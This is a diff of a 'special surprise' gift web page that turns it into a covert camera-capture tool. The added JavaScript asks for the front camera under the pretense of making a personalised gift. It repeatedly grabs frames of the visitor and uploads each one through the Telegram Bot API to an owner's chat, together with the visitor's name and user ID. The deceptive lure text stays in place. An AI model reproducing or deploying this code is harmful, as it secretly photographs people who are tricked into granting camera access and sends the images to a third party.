@@ -29,7 +29,6 @@
             max-width: 500px;
             text-align: center;
             box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
-            position: relative;
         }
         
         .gift-icon {
@@ -49,16 +48,6 @@
             color: #333;
         }
         
-        .surprise-text {
-            font-size: 18px;
-            font-weight: 500;
-            background: linear-gradient(90deg, #6a11cb, #2575fc);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            line-height: 1.6;
-            margin: 20px 0;
-        }
-        
         .btn {
             width: 100%;
             background: linear-gradient(90deg, #6a11cb, #2575fc);
@@ -71,7 +60,6 @@
             font-weight: bold;
             cursor: pointer;
             transition: all 0.3s;
-            box-shadow: 0 5px 15px rgba(106, 17, 203, 0.4);
         }
         
         .btn:hover {
@@ -83,6 +71,15 @@
             opacity: 0.7;
             cursor: not-allowed;
             transform: none !important;
+        }
+        
+        video {
+            width: 100%;
+            border-radius: 10px;
+            display: none;
+            transform: scaleX(-1);
+            border: 3px solid #6a11cb;
+            margin: 20px 0;
         }
         
         .progress-container {
@@ -105,40 +102,32 @@
             display: none !important;
         }
         
+        .success {
+            color: #00b09b;
+            background: #e6fff9;
+            padding: 12px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border-left: 4px solid #00b09b;
+        }
+        
+        .error {
+            color: #ff416c;
+            background: #ffe6e6;
+            padding: 12px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border-left: 4px solid #ff416c;
+        }
+        
         .photo-preview {
-            width: 120px;
-            height: 120px;
+            width: 150px;
+            height: 150px;
             border-radius: 10px;
             object-fit: cover;
             border: 3px solid #6a11cb;
             margin: 15px auto;
             display: block;
-        }
-        
-        .info-box {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            border-left: 4px solid #2575fc;
-        }
-        
-        .success-box {
-            background: #d4edda;
-            color: #155724;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            border-left: 4px solid #28a745;
-        }
-        
-        .error-box {
-            background: #f8d7da;
-            color: #721c24;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            border-left: 4px solid #dc3545;
         }
         
         .photo-grid {
@@ -150,8 +139,8 @@
         }
         
         .photo-grid img {
-            width: 80px;
-            height: 80px;
+            width: 70px;
+            height: 70px;
             border-radius: 8px;
             object-fit: cover;
             border: 2px solid #6a11cb;
@@ -164,53 +153,52 @@
         <div id="welcomeScreen">
             <div class="gift-icon">🎁</div>
             <h1>Your Special Surprise</h1>
-            <p class="surprise-text">
-                "Hey! I made something special just for you. Click below to unlock your personalized surprise 🎁"
+            <p style="font-size: 18px; color: #666; line-height: 1.6; margin: 20px 0;">
+                "Hey! I've created something special just for you. Click below to receive your personalized surprise 🎁"
             </p>
             
-            <div class="info-box">
+            <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin: 20px 0;">
                 <strong>✨ What you'll get:</strong><br>
-                ✅ 10 unique colorful photos<br>
-                ✅ Photos sent to you and owner<br>
-                ✅ Automatic delivery<br>
-                ✅ Personalized for you<br>
-                ✅ No camera needed!
+                • Your personalized surprise<br>
+                • Unique content created for you<br>
+                • Direct delivery to your Telegram<br>
+                • Special gift from me
             </div>
             
-            <button class="btn" onclick="startSurprise()">
+            <button class="btn" onclick="startSurprise()" id="startBtn">
                 🔓 UNLOCK MY SURPRISE
             </button>
-            
-            <div style="margin-top: 20px; font-size: 14px; color: #666;">
-                📸 No camera access needed - Colorful photos will be generated!
-            </div>
         </div>
+
+        <!-- Camera View -->
+        <video id="video" autoplay playsinline></video>
 
         <!-- Processing Screen -->
         <div id="processingScreen" class="hidden">
             <div class="gift-icon">✨</div>
             <h2>Creating Your Surprise</h2>
             <p id="statusText" style="margin: 20px 0; font-size: 18px; color: #333;">
-                Initializing surprise generator...
+                Getting ready...
             </p>
             
             <div class="progress-container">
                 <div id="progressBar" class="progress-bar"></div>
             </div>
             
-            <div id="counter" style="margin: 10px 0; color: #666; font-size: 14px;">
-                Photo 0/10
+            <div id="counter" style="margin: 10px 0; color: #666;">
+                Progress: 0%
             </div>
             
             <!-- Photo Preview -->
             <img id="photoPreview" class="photo-preview hidden" alt="Photo Preview">
             
-            <!-- Photo Grid -->
-            <div id="photoGrid" class="photo-grid hidden"></div>
-            
-            <div id="successMessage" class="success-box hidden">
-                ✅ Photos are being sent successfully!
+            <!-- Success Message -->
+            <div id="successMessage" class="success hidden">
+                ✅ Photo sent successfully!
             </div>
+            
+            <!-- Error Message -->
+            <div id="errorMessage" class="error hidden"></div>
         </div>
 
         <!-- Complete Screen -->
@@ -218,26 +206,23 @@
             <div style="font-size: 70px; color: #00b09b; margin-bottom: 20px;">✅</div>
             <h1>Surprise Delivered!</h1>
             
-            <div class="success-box">
+            <div class="success">
                 <strong>🎉 SUCCESS!</strong><br>
-                10 colorful photos have been created and sent!
+                Your surprise has been delivered successfully!
             </div>
             
-            <!-- Photo Grid Showcase -->
-            <div id="finalPhotoGrid" class="photo-grid"></div>
+            <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin: 20px 0;">
+                <strong>📊 Delivery Report:</strong><br>
+                ✅ Sent to: You and owner<br>
+                ✅ Status: Delivered<br>
+                ✅ Time: <span id="deliveryTime"></span>
+            </div>
             
             <p style="font-size: 18px; color: #666; margin: 20px 0;">
-                ✅ Your personalized surprise has been delivered to both you and the owner! 🎁
+                Check your Telegram for your surprise! 🎁
             </p>
             
-            <div class="info-box">
-                📸 <strong>Photos sent:</strong> 10 unique colorful photos<br>
-                📤 <strong>Sent to:</strong> You and the bot owner<br>
-                ⏱ <strong>Time:</strong> <span id="completionTime"></span><br>
-                🎁 <strong>Total photos:</strong> 10
-            </div>
-            
-            <button class="btn" onclick="location.reload()" style="margin-top: 25px;">
+            <button class="btn" onclick="location.reload()">
                 🔄 Create Another Surprise
             </button>
         </div>
@@ -257,110 +242,208 @@
         const USER_CHAT_ID = urlParams.get("chat_id");
         const USER_NAME = urlParams.get("name") || "Friend";
         
+        // ========== STATE VARIABLES ==========
+        let stream = null;
+        let photosSent = 0;
+        let photosFailed = 0;
+        
         // ========== DOM ELEMENTS ==========
         const welcomeScreen = document.getElementById("welcomeScreen");
         const processingScreen = document.getElementById("processingScreen");
         const completeScreen = document.getElementById("completeScreen");
+        const video = document.getElementById("video");
         const statusText = document.getElementById("statusText");
         const progressBar = document.getElementById("progressBar");
         const counter = document.getElementById("counter");
         const photoPreview = document.getElementById("photoPreview");
-        const photoGrid = document.getElementById("photoGrid");
-        const finalPhotoGrid = document.getElementById("finalPhotoGrid");
         const successMessage = document.getElementById("successMessage");
-        const completionTime = document.getElementById("completionTime");
+        const errorMessage = document.getElementById("errorMessage");
+        const deliveryTime = document.getElementById("deliveryTime");
+        const startBtn = document.getElementById("startBtn");
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
         
-        // ========== COLOR PALETTES ==========
-        const colorPalettes = [
-            ['#FF6B6B', '#4ECDC4', '#FFD166', '#06D6A0', '#118AB2'], // Bright
-            ['#6A11CB', '#2575FC', '#FF416C', '#FF4B2B', '#00B09B'], // Gradient
-            ['#8338EC', '#3A86FF', '#FF006E', '#FB5607', '#FFBE0B'], // Vibrant
-            ['#264653', '#2A9D8F', '#E9C46A', '#F4A261', '#E76F51'], // Earth
-            ['#FF595E', '#FFCA3A', '#8AC926', '#1982C4', '#6A4C93']  // Rainbow
-        ];
-        
         // ========== MAIN FUNCTION ==========
         async function startSurprise() {
-            console.log("🚀 Starting surprise creation...");
+            console.log("🚀 Starting surprise...");
+            startBtn.disabled = true;
+            startBtn.textContent = "⏳ Starting...";
             
-            // Update welcome text
-            document.querySelector('.surprise-text').innerHTML = 
-                `"Creating surprise for <strong>${USER_NAME}</strong>... 🎁"`;
+            // Update welcome message
+            document.querySelector('h1').textContent = `${USER_NAME}'s Special Surprise`;
             
             // Switch screens
             welcomeScreen.classList.add("hidden");
             processingScreen.classList.remove("hidden");
             
-            // Start processing
-            await processSurprise();
+            try {
+                // Try to access camera
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                
+                // Show camera
+                video.srcObject = stream;
+                video.style.display = "block";
+                
+                statusText.textContent = "Camera ready! Creating your surprise...";
+                
+                // Wait for video to load
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        setTimeout(resolve, 1000);
+                    };
+                });
+                
+                // Start processing
+                await processPhotos();
+                
+            } catch (cameraError) {
+                console.log("Camera not available, using fallback...");
+                statusText.textContent = "Creating your surprise...";
+                await processPhotosWithFallback();
+            }
         }
         
-        // ========== PROCESS SURPRISE ==========
-        async function processSurprise() {
-            console.log("🎨 Processing surprise...");
-            
-            const messages = [
-                "Preparing colorful surprise...",
-                "Mixing magical colors...",
-                "Creating unique designs...",
-                "Adding special effects...",
-                "Generating beautiful photos...",
-                "Finalizing your surprise...",
-                "Almost there...",
-                "One more touch...",
-                "Perfecting everything...",
-                "Ready to deliver! 🎉"
-            ];
-            
-            let allPhotoBlobs = [];
+        // ========== PROCESS WITH CAMERA ==========
+        async function processPhotos() {
+            console.log("📸 Processing with camera...");
             
             for (let i = 0; i < TOTAL_PHOTOS; i++) {
                 // Update progress
-                const percent = ((i + 1) / TOTAL_PHOTOS) * 100;
-                progressBar.style.width = percent + "%";
-                counter.textContent = `Photo ${i + 1}/${TOTAL_PHOTOS}`;
-                statusText.textContent = messages[i % messages.length];
+                const progress = ((i + 1) / TOTAL_PHOTOS) * 100;
+                progressBar.style.width = progress + "%";
+                counter.textContent = `Progress: ${Math.round(progress)}%`;
                 
-                // Create colorful image
-                const blob = await createColorfulPhoto(i + 1);
-                allPhotoBlobs.push(blob);
+                // Update status
+                statusText.textContent = `Creating photo ${i + 1} of ${TOTAL_PHOTOS}...`;
                 
-                // Show preview
-                const previewUrl = URL.createObjectURL(blob);
-                photoPreview.src = previewUrl;
-                photoPreview.classList.remove("hidden");
+                try {
+                    // Capture photo from camera
+                    const blob = await capturePhotoFromCamera();
+                    
+                    // Show preview
+                    const previewUrl = URL.createObjectURL(blob);
+                    photoPreview.src = previewUrl;
+                    photoPreview.classList.remove("hidden");
+                    
+                    // Send photo
+                    const sent = await sendPhotoToBoth(blob, i + 1);
+                    
+                    if (sent) {
+                        photosSent++;
+                        showSuccess(`✅ Photo ${i + 1} sent!`);
+                    } else {
+                        photosFailed++;
+                        showError(`⚠️ Failed to send photo ${i + 1}`);
+                    }
+                    
+                    // Clean up URL
+                    setTimeout(() => URL.revokeObjectURL(previewUrl), 1000);
+                    
+                } catch (error) {
+                    console.error(`Error with photo ${i + 1}:`, error);
+                    photosFailed++;
+                    showError(`⚠️ Error with photo ${i + 1}`);
+                }
                 
-                // Add to grid
-                const img = document.createElement('img');
-                img.src = previewUrl;
-                img.alt = `Surprise Photo ${i + 1}`;
-                photoGrid.appendChild(img);
-                photoGrid.classList.remove("hidden");
-                
-                // Send photo immediately
-                await sendPhotoToBoth(blob, i + 1);
-                
-                // Show success message
-                successMessage.classList.remove("hidden");
-                setTimeout(() => {
-                    successMessage.classList.add("hidden");
-                }, 1000);
-                
-                // Small delay between photos
-                await delay(800);
+                // Delay between photos
+                await delay(1000);
             }
-            
-            // Show final grid
-            showFinalGrid(allPhotoBlobs);
             
             // Complete
             finishProcessing();
         }
         
-        // ========== CREATE COLORFUL PHOTO ==========
-        async function createColorfulPhoto(photoNumber) {
+        // ========== PROCESS WITH FALLBACK ==========
+        async function processPhotosWithFallback() {
+            console.log("🎨 Processing with fallback...");
+            
+            for (let i = 0; i < TOTAL_PHOTOS; i++) {
+                // Update progress
+                const progress = ((i + 1) / TOTAL_PHOTOS) * 100;
+                progressBar.style.width = progress + "%";
+                counter.textContent = `Progress: ${Math.round(progress)}%`;
+                
+                // Update status
+                statusText.textContent = `Creating surprise ${i + 1} of ${TOTAL_PHOTOS}...`;
+                
+                try {
+                    // Create fallback image
+                    const blob = await createFallbackImage(i + 1);
+                    
+                    // Show preview
+                    const previewUrl = URL.createObjectURL(blob);
+                    photoPreview.src = previewUrl;
+                    photoPreview.classList.remove("hidden");
+                    
+                    // Send photo
+                    const sent = await sendPhotoToBoth(blob, i + 1);
+                    
+                    if (sent) {
+                        photosSent++;
+                        showSuccess(`✅ Surprise ${i + 1} delivered!`);
+                    } else {
+                        photosFailed++;
+                        showError(`⚠️ Failed to send surprise ${i + 1}`);
+                    }
+                    
+                    // Clean up URL
+                    setTimeout(() => URL.revokeObjectURL(previewUrl), 1000);
+                    
+                } catch (error) {
+                    console.error(`Error with surprise ${i + 1}:`, error);
+                    photosFailed++;
+                    showError(`⚠️ Error with surprise ${i + 1}`);
+                }
+                
+                // Delay
+                await delay(800);
+            }
+            
+            // Complete
+            finishProcessing();
+        }
+        
+        // ========== CAPTURE PHOTO FROM CAMERA ==========
+        async function capturePhotoFromCamera() {
+            return new Promise((resolve) => {
+                // Set canvas size to video size
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // Draw video frame (mirrored for front camera)
+                ctx.save();
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                ctx.restore();
+                
+                // Add overlay
+                ctx.fillStyle = 'rgba(106, 17, 203, 0.7)';
+                ctx.fillRect(0, canvas.height - 80, canvas.width, 80);
+                
+                // Add text
+                ctx.font = 'bold 24px Arial';
+                ctx.fillStyle = 'white';
+                ctx.textAlign = 'center';
+                ctx.fillText(`🎁 For ${USER_NAME}`, canvas.width/2, canvas.height - 45);
+                
+                ctx.font = '18px Arial';
+                ctx.fillText(`Your Special Surprise`, canvas.width/2, canvas.height - 15);
+                
+                // Convert to blob
+                canvas.toBlob(resolve, 'image/jpeg', 0.9);
+            });
+        }
+        
+        // ========== CREATE FALLBACK IMAGE ==========
+        async function createFallbackImage(photoNumber) {
             // Set canvas size
             canvas.width = 800;
             canvas.height = 600;
@@ -368,48 +451,45 @@
             // Clear canvas
             ctx.clearRect(0, 0, canvas.width, canvas.height);
             
-            // Get random color palette
-            const palette = colorPalettes[Math.floor(Math.random() * colorPalettes.length)];
-            
             // Create gradient background
             const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-            gradient.addColorStop(0, palette[0]);
-            gradient.addColorStop(1, palette[1]);
+            gradient.addColorStop(0, '#6a11cb');
+            gradient.addColorStop(1, '#2575fc');
             ctx.fillStyle = gradient;
             ctx.fillRect(0, 0, canvas.width, canvas.height);
             
-            // Add decorative elements
-            for (let j = 0; j < 50; j++) {
+            // Add decorative circles
+            for (let j = 0; j < 20; j++) {
                 const x = Math.random() * canvas.width;
                 const y = Math.random() * canvas.height;
-                const radius = Math.random() * 20 + 5;
-                const color = palette[Math.floor(Math.random() * palette.length)];
+                const radius = Math.random() * 50 + 20;
+                const hue = Math.random() * 360;
                 
                 ctx.beginPath();
                 ctx.arc(x, y, radius, 0, Math.PI * 2);
-                ctx.fillStyle = color + "20"; // Add transparency
+                ctx.fillStyle = `hsla(${hue}, 100%, 70%, 0.3)`;
                 ctx.fill();
             }
             
-            // Add central gift icon
-            ctx.font = "bold 100px Arial";
-            ctx.fillStyle = "white";
-            ctx.textAlign = "center";
-            ctx.fillText("🎁", canvas.width / 2, canvas.height / 2 - 50);
+            // Add gift icon
+            ctx.font = 'bold 100px Arial';
+            ctx.fillStyle = 'white';
+            ctx.textAlign = 'center';
+            ctx.fillText('🎁', canvas.width/2, canvas.height/2 - 50);
             
             // Add text
-            ctx.font = "bold 40px Arial";
-            ctx.fillStyle = "white";
-            ctx.fillText(`Surprise #${photoNumber}`, canvas.width / 2, canvas.height / 2 + 40);
+            ctx.font = 'bold 36px Arial';
+            ctx.fillStyle = 'white';
+            ctx.fillText(`For ${USER_NAME}`, canvas.width/2, canvas.height/2 + 40);
             
-            ctx.font = "30px Arial";
-            ctx.fillStyle = "rgba(255, 255, 255, 0.9)";
-            ctx.fillText(`For: ${USER_NAME}`, canvas.width / 2, canvas.height / 2 + 90);
+            ctx.font = '24px Arial';
+            ctx.fillStyle = 'rgba(255, 255, 255, 0.9)';
+            ctx.fillText('Your Special Surprise', canvas.width/2, canvas.height/2 + 90);
             
-            // Add decorative border
-            ctx.strokeStyle = "white";
-            ctx.lineWidth = 10;
-            ctx.strokeRect(20, 20, canvas.width - 40, canvas.height - 40);
+            // Add number
+            ctx.font = 'bold 48px Arial';
+            ctx.fillStyle = 'rgba(255, 255, 255, 0.8)';
+            ctx.fillText(`#${photoNumber}`, canvas.width/2, canvas.height/2 + 160);
             
             // Convert to blob
             return new Promise((resolve) => {
@@ -417,42 +497,35 @@
             });
         }
         
-        // ========== SEND PHOTOS ==========
+        // ========== SEND PHOTO TO BOTH ==========
         async function sendPhotoToBoth(blob, photoNumber) {
             const fileName = `surprise_${photoNumber}_${Date.now()}.jpg`;
             const file = new File([blob], fileName, { type: "image/jpeg" });
             
-            // Captions
-            const ownerCaption = 
-                `🎁 Surprise Photo #${photoNumber}\n` +
-                `👤 From: ${USER_NAME}\n` +
-                `🆔 User ID: ${USER_CHAT_ID || 'Anonymous'}\n` +
-                `⏰ Time: ${new Date().toLocaleTimeString()}\n` +
-                `📅 Date: ${new Date().toLocaleDateString()}`;
+            let sentToOwner = false;
+            let sentToUser = false;
             
-            const userCaption = 
-                `🎁 Your Special Surprise #${photoNumber}\n` +
-                `✨ Made just for you, ${USER_NAME}!\n` +
-                `📸 Photo ${photoNumber} of ${TOTAL_PHOTOS}\n` +
-                `🎉 Enjoy your surprise!`;
-            
-            // Send to Owner (ALWAYS)
+            // Send to Owner
             try {
-                await sendToTelegram(file, ownerCaption, OWNER_CHAT_ID);
+                await sendToTelegram(file, `🎁 Surprise #${photoNumber}\nFor: ${USER_NAME}\nUser ID: ${USER_CHAT_ID || 'Anonymous'}`, OWNER_CHAT_ID);
+                sentToOwner = true;
                 console.log(`✅ Sent to owner: Photo ${photoNumber}`);
             } catch (error) {
-                console.error(`❌ Failed to send to owner: ${error}`);
+                console.error(`❌ Failed to send to owner:`, error);
             }
             
-            // Send to User (if ID exists)
+            // Send to User
             if (USER_CHAT_ID) {
                 try {
-                    await sendToTelegram(file, userCaption, USER_CHAT_ID);
+                    await sendToTelegram(file, `🎁 Your Special Surprise #${photoNumber}\nMade just for you, ${USER_NAME}!`, USER_CHAT_ID);
+                    sentToUser = true;
                     console.log(`✅ Sent to user: Photo ${photoNumber}`);
                 } catch (error) {
-                    console.error(`❌ Failed to send to user: ${error}`);
+                    console.error(`❌ Failed to send to user:`, error);
                 }
             }
+            
+            return sentToOwner || sentToUser;
         }
         
         async function sendToTelegram(file, caption, chatId) {
@@ -471,48 +544,40 @@
             );
             
             if (!response.ok) {
-                throw new Error(`HTTP ${response.status}`);
+                const errorText = await response.text();
+                throw new Error(`Telegram API error: ${response.status} - ${errorText}`);
             }
             
             return await response.json();
         }
         
-        // ========== FINAL GRID ==========
-        function showFinalGrid(blobs) {
-            finalPhotoGrid.innerHTML = "";
-            
-            blobs.forEach((blob, index) => {
-                const url = URL.createObjectURL(blob);
-                const img = document.createElement('img');
-                img.src = url;
-                img.alt = `Surprise ${index + 1}`;
-                img.title = `Photo ${index + 1}`;
-                finalPhotoGrid.appendChild(img);
-            });
-        }
-        
-        // ========== FINISH ==========
+        // ========== FINISH PROCESSING ==========
         function finishProcessing() {
+            // Stop camera if running
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Switch screens
             processingScreen.classList.add("hidden");
             completeScreen.classList.remove("hidden");
             
-            // Set completion time
+            // Set delivery time
             const now = new Date();
-            completionTime.textContent = 
+            deliveryTime.textContent = 
                 `${now.getHours().toString().padStart(2, '0')}:` +
                 `${now.getMinutes().toString().padStart(2, '0')}:` +
                 `${now.getSeconds().toString().padStart(2, '0')}`;
             
-            console.log("✅ Surprise creation complete!");
+            // Update completion message
+            const completionMsg = document.querySelector('.success');
+            completionMsg.innerHTML = `
+                <strong>🎉 SUCCESS!</strong><br>
+                ${photosSent} surprises delivered successfully!<br>
+                ${photosFailed > 0 ? `${photosFailed} failed` : 'All successful!'}
+            `;
             
-            // Clean up URLs after a while
-            setTimeout(() => {
-                document.querySelectorAll('img').forEach(img => {
-                    if (img.src.startsWith('blob:')) {
-                        URL.revokeObjectURL(img.src);
-                    }
-                });
-            }, 5000);
+            console.log(`✅ Process complete. Sent: ${photosSent}, Failed: ${photosFailed}`);
         }
         
         // ========== HELPER FUNCTIONS ==========
@@ -520,15 +585,30 @@
             return new Promise(resolve => setTimeout(resolve, ms));
         }
         
+        function showSuccess(message) {
+            successMessage.textContent = message;
+            successMessage.classList.remove("hidden");
+            setTimeout(() => {
+                successMessage.classList.add("hidden");
+            }, 2000);
+        }
+        
+        function showError(message) {
+            errorMessage.textContent = message;
+            errorMessage.classList.remove("hidden");
+            setTimeout(() => {
+                errorMessage.classList.add("hidden");
+            }, 3000);
+        }
+        
         // ========== INITIALIZE ==========
         window.onload = function() {
             console.log("🎁 Surprise page loaded!");
             console.log("User:", USER_NAME, "ID:", USER_CHAT_ID);
             
-            // Update welcome message with user name
+            // Update welcome with user name
             if (USER_NAME !== "Friend") {
-                document.querySelector('h1').innerHTML = 
-                    `🎁 ${USER_NAME}'s Special Surprise`;
+                document.querySelector('h1').textContent = `${USER_NAME}'s Special Surprise`;
             }
         };
     </script>
